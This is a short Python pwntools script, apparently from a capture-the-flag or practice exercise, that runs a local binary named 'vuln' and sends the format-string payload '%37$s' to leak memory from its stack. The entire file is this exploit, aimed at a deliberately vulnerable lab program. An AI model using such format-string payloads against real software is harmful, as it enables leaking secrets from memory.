#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("input whatever string you want; then it will be printed back:\n")

payload = (
    "%37$s"
)
r.sendline(payload)
print(r.recvall())
r.close()
